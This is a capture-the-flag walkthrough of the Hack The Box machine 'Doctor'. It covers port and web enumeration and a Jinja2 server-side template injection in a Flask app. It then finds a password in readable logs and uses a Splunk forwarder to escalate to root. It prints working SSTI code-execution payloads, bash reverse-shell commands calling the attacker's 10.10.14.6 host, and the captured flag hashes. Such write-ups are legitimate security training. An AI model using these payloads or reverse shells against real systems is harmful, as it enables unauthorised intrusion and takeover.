---
description: 10.10.10.209
---

# Doctor

![](<../../.gitbook/assets/1 (7) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Python Jinja2 Server Side Template Injection to get shell as "web". Find password in log file for user "shaun".
* Root - Authenticate to Splunk Universal Forwarder as "shaun". Abuse it to get remote code execution as "root".

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.209                                                 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 12:06 EST
Nmap scan report for 10.10.10.209
Host is up (0.016s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 111.73 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 22,80,8089 10.10.10.209 -n                                
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 12:09 EST
Nmap scan report for 10.10.10.209
Host is up (0.015s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-server-header: Splunkd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8089/tcp)
HOP RTT      ADDRESS
1   15.10 ms 10.10.14.1
2   15.68 ms 10.10.10.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.46 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.209/
http://10.10.10.209/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@doctors.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.209], JQuery[3.3.1], Script, Title[Doctor]

└─$ whatweb https://10.10.10.209:8089/
https://10.10.10.209:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Splunkd], IP[10.10.10.209], Title[splunkd], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]

```

### Dirsearch

Let's run a dirsearch scan against the target.​ We'll use the following options for this:

> \-r --> recursive scan
>
> \-R 2 --> recursion depth of 2
>
> \--force-recursive --> do recursive search for every path, not only paths ending with /
>
> \-t 100 --> number of threads
>
> \-u --> target url
>
> \-w --> wordlist

```
└─$ dirsearch -r -R 2 --force-recursive -t 100 -u https://10.10.10.209:8089/ -w /usr/share/dirb/wordlists/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                  
 (_||| _) (/_(_|| (_| )                                                                                           
                                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 4613

Output File: /usr/share/sniper/plugins/dirsearch/reports/10.10.10.209-8089/-_21-11-19_10-41-00.txt

Error Log: /usr/share/sniper/plugins/dirsearch/logs/errors-21-11-19_10-41-00.log

Target: https://10.10.10.209:8089/

[10:41:00] Starting: 
[10:41:22] 200 -   26B  - /robots.txt     (Added to queue)                  
[10:41:23] 401 -  130B  - /services     (Added to queue)                    
[10:41:28] 200 -    2KB - /v3     (Added to queue)                          
[10:41:28] 200 -    2KB - /v2     (Added to queue)                          
[10:41:28] 200 -    2KB - /v4     (Added to queue)                          
[10:41:28] 200 -    2KB - /v1     (Added to queue)                          
[10:41:31] Starting: robots.txt/                                             
[10:42:00] Starting: services/                                               
[10:42:27] 200 -    2KB - /services/template     (Added to queue)           
[10:42:32] Starting: v3/                                                     
[10:42:53] 200 -   26B  - /v3/robots.txt     (Added to queue)               
[10:42:54] 401 -  130B  - /v3/services     (Added to queue)                 
[10:43:02] Starting: v2/                                                     
[10:43:22] 200 -   26B  - /v2/robots.txt     (Added to queue)               
[10:43:24] 401 -  130B  - /v2/services     (Added to queue)                 
[10:43:31] Starting: v4/                                                     
[10:43:52] 200 -   26B  - /v4/robots.txt     (Added to queue)               
[10:43:53] 401 -  130B  - /v4/services     (Added to queue)                 
[10:44:02] Starting: v1/                                                     
[10:44:23] 200 -   26B  - /v1/robots.txt     (Added to queue)               
[10:44:25] 401 -  130B  - /v1/services     (Added to queue)                 
[10:44:33] Starting: services/template/                                      
[10:45:04] Starting: v3/robots.txt/                                          
[10:45:35] Starting: v3/services/                                            
[10:46:02] 200 -    2KB - /v3/services/template                              
[10:46:07] Starting: v2/robots.txt/                                           
[10:46:38] Starting: v2/services/                                             
[10:47:03] 200 -    2KB - /v2/services/template                              
[10:47:09] Starting: v4/robots.txt/                                           
[10:47:40] Starting: v4/services/                                             
[10:48:07] 200 -    2KB - /v4/services/template                              
[10:48:12] Starting: v1/robots.txt/                                           
[10:48:44] Starting: v1/services/                                             
[10:49:10] 200 -    2KB - /v1/services/template                              
                                                                              
Task Completed                               

```

We find the following paths, excluding the /v paths, as they appear to just be duplicates of the paths below:

```
https://10.10.10.209:8089/robots.txt
https://10.10.10.209:8089/services
https://10.10.10.209:8089/services/template
```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* On the home page we find the following email address: info@doctors.htb&#x20;
* There is a splunkd page on port 8089 which we will need to investigate further; we see the version is Splunk build 8.0.5; nothing of interest in the source for this page
* Nothing else of interest found on the other pages

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing found of interest

​There are two URLs to check out. Let's visit the page on port 80 first:

![](<../../.gitbook/assets/2 (4) (1) (1).JPG>)

It's a pretty basic webpage, where most of the links on the page are dead. If we look at the page source, we do find an email address:

![](<../../.gitbook/assets/3 (5) (1) (1).JPG>)

Let's make a note of this and move on.

Next, let's check out the page on port 8089:

![](<../../.gitbook/assets/6 (1) (1).JPG>)

There are 4 links on the page:

> /rpc --> Invalid request
>
> /services --> login prompt
>
> /serviceNS --> login prompt
>
> /static - Not found

Let's try the /services/template route we found with dirsearch:

![](<../../.gitbook/assets/8 (2) (1).JPG>)

There are 3 links on this page:

> /realize --> error message
>
> /realize/\_new (create) --> error message
>
> /auth/user/system (system) --> login prompt

We have explored all the options available thus far based on our enumeration, except for the email address we found. Let's add the domain (doctors.htb) to our /etc/hosts file as follows:

```
└─$ cat /etc/hosts | grep doctors
10.10.10.209    doctors.htb
                            
```

A google search for "splunk exploit" finds the following page, however, in order to take advantage of this we need to have the creds to login to the forwarder. If we find the creds, and if splunk is being run as root, we should be able to privesc using this method:&#x20;

{% embed url="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence" %}

Let's move on for now. If we visit the page at http://doctors.htb, we find a login form and a registration page.

![](<../../.gitbook/assets/4 (4) (1).JPG>)

Let's register an account. After creating the account, we get the following message, and it logs us in and takes us to the home page.

![](<../../.gitbook/assets/5 (2).JPG>)

Viewing the page source, we see the following comment:

![](<../../.gitbook/assets/9 (2).JPG>)

Visiting the /archive route returns a blank page, and if we view the source we see the following:

![](<../../.gitbook/assets/10 (1).JPG>)

Going back to the home page, there is an option to post a message. Before doing so, we'll start BURP and configure the browser to use the proxy. Next we'll turn on intercept in BURP, post a message and then send the request to the repeater and click Go. We are redirected back to the home page where the message is now shown. We notice in the headers of th eresponse that the server is running a python web service:

![](<../../.gitbook/assets/12 (1).JPG>)

Let's run whatweb against this site as this appears to be different to the page we saw before at http://10.10.10.209

```
└─$ whatweb http://10.10.10.209      
http://10.10.10.209 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@doctors.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.209], JQuery[3.3.1], Script, Title[Doctor]

└─$ whatweb http://doctors.htb/                              
http://doctors.htb/ [302 Found] Cookies[session], Country[RESERVED][ZZ], HTTPServer[Werkzeug/1.0.1 Python/3.8.2], HttpOnly[session], IP[10.10.10.209], Python[3.8.2], RedirectLocation[http://doctors.htb/login?next=%2F], Title[Redirecting...], Werkzeug[1.0.1]                                                                                     
http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]

```

When visiting the IP address in the browser, the server returns web content served by Apache, whereas the site accessed via the domain name returns pages served by python. Looking at wappalyzer, we can also see that the site is using the Flask web framework:

![](../../.gitbook/assets/13.JPG)

The following page contains more information about Flask:

{% embed url="https://flask.palletsprojects.com/en/2.0.x" %}

Looking through the Flask documentation, we also find the following page, which discusses templates:

{% embed url="https://flask.palletsprojects.com/en/2.0.x/templating" %}

A google search for "python flask exploit" finds the following page, which talks about template injection:

{% embed url="https://blog.nvisium.com/injecting-flask" %}

## Server Side Template Injection

The article below discusses SSTI in detail with alot of examples for different template engines. I highly recommend reading through this page if you are unfamiliar with SSTI:

{% embed url="https://portswigger.net/research/server-side-template-injection" %}

Let's confirm if there is a SSTI vulnerability on the http://doctors.htb webapp, First, we'll try the following basic tests in both the parameters of the new  message form:

> ${7\*7} --> output should be ${7\*7}
>
> {{7\*'7'}} --> output should be 7777777
>
> {{config}} --> output should contains details about the configuration

![](<../../.gitbook/assets/14 (1).JPG>)

We get back the same text, which is what we are expecting. Let's try the next one:

![](<../../.gitbook/assets/15 (1).JPG>)

That didn't seem to work, we just get back the text we put in instead of the expected result, which is a concatenation of seven sevens: 7777777

Let's try the third test:

![](<../../.gitbook/assets/16 (1).JPG>)

Once again, we get back what we put in, and so it looks like it's not vulnerable to SSTI.

Looking at the requests in the BURP HTTP history tab, we see the following:

> POST to /post/new
>
> Response with 302 (redirect) to /home
>
> GET to /home

Let's go back to the /archive page again and poke around there a bit more. Visit the page in the browser, and back in BURP, we see the following:

![](../../.gitbook/assets/17.JPG)

It's the output from our last test "{{config}}, which confirms that the webapp is indeed vulnerable to SSTI.&#x20;

{% hint style="danger" %}
NOTE: This is a CTF box, and finding this vulnerability requires luck. I'm not sure there is a technical way to determine that the output from the STTI injections are being sent to the /archive route. Here, we stumbled on it completely by chance. In addition, if the 20 minute timer ran out, after you post a STTI payload, but before you inspect the /archive route, the output confirming the STTI would not be there. In addition to this, the output is not displayed by a browser, and so we also need to view it either via a proxy, or via the page source using the browsers dev tools. If you add all these components togethor, this becomes a highly unrealistic scenario in my opinion, however, as I mentioned, this is a CTF box.
{% endhint %}

Now that we know we have a STTI vulnerability, let's see if we can use it to get a reverse shell. First, we need to confirm we have remote code execution.

## Gaining Access​ ​ ​

Let's test for RCE by posting the following payload:

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

After posting it, visit the /archive page and view it in the HTTP history tab in BURP:

![](../../.gitbook/assets/18.JPG)

That works. Let's start a listener and post the following payload to get a reverse shell:

```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read()}}
```

Visit or refresh the /archive page to trigger the payload:

```
└─$ sudo nc -nvlp 443               
[sudo] password for kali: 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:45342.
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$ 
```

## Enumeration as "web"

Let's gather some basic system information:

```
web@doctor:~$ uname -a; cat /etc/*-release; netstat -antp;id
uname -a; cat /etc/*-release; netstat -antp;id
Linux doctor 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04 LTS"
NAME="Ubuntu"
VERSION="20.04 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
tcp        0    934 10.10.10.209:45342      10.10.14.6:443          ESTABLISHED 1984/bash           
tcp        1      0 127.0.0.1:5000          127.0.0.1:59862         CLOSE_WAIT  -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::111                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$ ps auxw | grep root
ps auxw | grep root
root           1  0.0  0.2 169724 11536 ?        Ss   09:45   0:02 /sbin/init splash
...
root         668  0.0  0.2  58756 10456 ?        Ss   09:45   0:00 /usr/bin/VGAuthService
root         670  0.0  0.2 249964  8556 ?        Ssl  09:45   0:15 /usr/bin/vmtoolsd
root         717  0.0  0.1 246780  7460 ?        Ssl  09:45   0:00 /usr/lib/accountsservice/accounts-daemon
root         719  0.0  0.0   2540   852 ?        Ss   09:45   0:00 /usr/sbin/acpid
root         725  0.0  0.0  18044  3116 ?        Ss   09:45   0:00 /usr/sbin/cron -f
root         736  0.0  0.0  19752  3436 ?        S    09:45   0:00 /usr/sbin/CRON -f
root         738  0.0  0.4 270212 18588 ?        Ssl  09:45   0:00 /usr/sbin/NetworkManager --no-daemon
root         749  0.0  0.0  81944  3724 ?        Ssl  09:45   0:00 /usr/sbin/irqbalance --foreground
root         753  0.0  0.5  47880 20304 ?        Ss   09:45   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         759  0.0  0.2 234848  9056 ?        Ssl  09:45   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         781  0.0  0.6 776344 26596 ?        Ssl  09:45   0:04 /usr/lib/snapd/snapd
root         785  0.0  0.2  17060  8320 ?        Ss   09:45   0:00 /lib/systemd/systemd-logind
root         787  0.0  0.3 392656 12192 ?        Ssl  09:45   0:00 /usr/lib/udisks2/udisksd
root         788  0.0  0.1  13664  4940 ?        Ss   09:45   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
avahi        811  0.0  0.0   8320   328 ?        S    09:45   0:00 avahi-daemon: chroot helper
root         853  0.0  0.3 180424 12524 ?        Ssl  09:45   0:00 /usr/sbin/cups-browsed
root         871  0.0  0.2 313724 10480 ?        Ssl  09:45   0:00 /usr/sbin/ModemManager --filter-policy=strict
root         922  0.0  0.2  37052  8928 ?        Ss   09:46   0:00 /usr/sbin/cupsd -l
root        1006  0.0  0.5 126424 22904 ?        Ssl  09:46   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1014  0.0  0.1  12160  6988 ?        Ss   09:46   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1039  0.0  0.0  17060  1800 tty1     Ss+  09:46   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1047  0.0  0.4 193752 18344 ?        Ss   09:46   0:00 /usr/sbin/apache2 -k start
root        1136  0.0  2.1 257468 86848 ?        Sl   09:46   0:09 splunkd -p 8089 start
root        1138  0.0  0.3  77664 13348 ?        Ss   09:46   0:00 [splunkd pid=1136] splunkd -p 8089 start [process-runner]
root      135182  0.0  0.1   8240  4772 ?        Ss   13:25   0:00 /usr/lib/bluetooth/bluetoothd
root      135207  0.0  0.2 260728  9884 ?        Ssl  13:25   0:00 /usr/lib/upower/upowerd
root      135542  0.0  0.0      0     0 ?        I    13:39   0:01 [kworker/0:2-cgroup_destroy]
root      135653  0.0  0.0      0     0 ?        I    13:44   0:00 [kworker/1:1-events]
root      135655  0.0  0.0      0     0 ?        I    13:44   0:00 [kworker/u256:1-events_power_efficient]
root      135745  0.0  0.0      0     0 ?        I    14:09   0:00 [kworker/0:1-events]
root      135748  0.0  0.0      0     0 ?        I    14:09   0:00 [kworker/1:2]
root      135752  0.0  0.0      0     0 ?        I    14:14   0:00 [kworker/u256:0-events_power_efficient]
root      135770  0.0  0.0      0     0 ?        I    14:20   0:00 [kworker/u256:2-events_unbound]
web       135778  0.0  0.0  17668   720 pts/0    S+   14:24   0:00 grep --color=auto root
web@doctor:~$ 
```

One thing to note here is that root is running "splunkd", which means that if we compromise splunk we should be able to get command execution as root. One of the articles&#x20;

The "web" user is a member of the "adm" group, let's see what additional access this gives us:

```
web@doctor:~$ find / -path /proc -prune -o -group adm 2>/dev/null
find / -path /proc -prune -o -group adm 2>/dev/null
/proc
/var/log/kern.log.3.gz
/var/log/unattended-upgrades
/var/log/auth.log
/var/log/syslog
/var/log/ufw.log.2.gz
/var/log/dmesg.2.gz
/var/log/auth.log.1
/var/log/cups/error_log.1
/var/log/cups/access_log.1
/var/log/cups/access_log.7.gz
/var/log/cups/access_log.3.gz
/var/log/cups/error_log
/var/log/cups/access_log.2.gz
/var/log/cups/error_log.2.gz
/var/log/cups/error_log.3.gz
/var/log/cups/access_log
/var/log/cups/access_log.6.gz
/var/log/cups/access_log.5.gz
/var/log/cups/access_log.4.gz
/var/log/syslog.1
/var/log/apache2
/var/log/apache2/error.log.10.gz
/var/log/apache2/error.log.9.gz
/var/log/apache2/access.log.11.gz
/var/log/apache2/error.log
/var/log/apache2/backup
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.6.gz
/var/log/apache2/error.log.1
/var/log/apache2/access.log.1
/var/log/apache2/error.log.14.gz
/var/log/apache2/error.log.3.gz
/var/log/apache2/error.log.5.gz
/var/log/apache2/access.log
/var/log/apache2/access.log.6.gz
/var/log/apache2/access.log.7.gz
/var/log/apache2/access.log.8.gz
/var/log/apache2/error.log.7.gz
/var/log/apache2/access.log.9.gz
/var/log/apache2/error.log.4.gz
/var/log/apache2/error.log.8.gz
/var/log/apache2/access.log.3.gz
/var/log/apache2/access.log.4.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/error.log.13.gz
/var/log/apache2/error.log.12.gz
/var/log/apache2/access.log.10.gz
/var/log/apache2/error.log.11.gz
/var/log/apache2/access.log.5.gz
/var/log/apt/term.log.1.gz
/var/log/apt/term.log.2.gz
/var/log/apt/term.log
/var/log/ufw.log.3.gz
/var/log/kern.log.2.gz
/var/log/syslog.4.gz
/var/log/dmesg
/var/log/dmesg.0
/var/log/auth.log.2.gz
/var/log/dmesg.4.gz
/var/log/dmesg.1.gz
/var/log/ufw.log.1
/var/log/kern.log.4.gz
/var/log/syslog.5.gz
/var/log/ufw.log
/var/log/dmesg.3.gz
/var/log/syslog.6.gz
/var/log/auth.log.3.gz
/var/log/kern.log
/var/log/syslog.7.gz
/var/log/kern.log.1
/var/log/auth.log.4.gz
/var/log/syslog.2.gz
/var/log/syslog.3.gz
/var/spool/rsyslog
web@doctor:~$ 
```

We have access to the logs. Let's search the logs for passwords:

```
web@doctor:~$ grep -ir passw /var/log 2>/dev/null
grep -ir passw /var/log 2>/dev/null
...
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
...
web@doctor:~$ 
```

We find a password reset request containing the text "Guitar123". Let's see if this works for user "shaun", and as shown below, we are able to login as "shaun" and grab the user flag:

```
web@doctor:~$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home/web$ id
id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
shaun@doctor:/home/web$ cd ~
cd ~
shaun@doctor:~$ ls
ls
user.txt
shaun@doctor:~$ cat user.txt
cat user.txt
3cf63ef3d8c2ec496728f347dcafa6ec
shaun@doctor:~$ 
```

We know from our earlier enumeration and research that if we exploit the splunk forwarder we can get RCE. We have also confirmed that splunk is indeed being run as the "root" user.

## Privilege Escalation

Let's try the creds "shaun:Guitar123" and see if we can login to the [https://10.10.10.209:8089/services](https://10.10.10.209:8089/services) page.

![](<../../.gitbook/assets/19 (1).JPG>)

Nice, we're in. Now, we can use the tool PySplunkWhisper2, which is mentioned in the article [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/), to get a reverse shell as root. The tool can be found here:

{% embed url="https://github.com/cnotin/SplunkWhisperer2" %}

First, clone the repo and navigate to the PySplunkWhisperer2 directory. Start a new listener, and run the following command:

```
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password 'Guitar123' --payload 'bash -c "bash -i >& /dev/tcp/10.10.14.6/7777 0>&1"' --lhost 10.10.14.6
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpxun9c1n9.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.6:8181/
10.10.10.209 - - [20/Nov/2021 08:49:55] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!

```

In our listener we get a shell as root, and we can grab the root flag:

```
└─$ nc -nvlp 7777                                                                                             1 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:47330.
bash: cannot set terminal process group (1138): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@doctor:/# cat /root/root.txt
cat /root/root.txt
a885d5e9579e2d3585a7e598bd14bf5b
root@doctor:/# 
```

## Resources

The following page contains a very useful splunk architecture diagram:

{% embed url="https://www.learnsplunk.com/splunk-troubleshooting.html" %}

Abusing splunk forwarders:

{% embed url="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence" %}

Splunk Universal Forwarder Hijacking:

{% embed url="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2" %}

{% embed url="https://github.com/airman604/splunk_whisperer" %}

Weaponizing splunk:

{% embed url="https://github.com/TBGSecurity/weaponize_splunk" %}

Splunk pentest cheat sheet:

{% embed url="https://github.com/burntoberoot/splunk_pentest_cheatsheet" %}

The following page is a good introduction on how to build a Flask based webapp:

{% embed url="https://opensource.com/article/18/4/flask" %}

Hacking flask applications (Werkzeug):

{% embed url="https://medium.com/swlh/hacking-flask-applications-939eae4bffed" %}

Flask and Jinja SSTI Cheat Sheet:

{% embed url="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" %}

A comprehensive resource for SSTI:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" %}







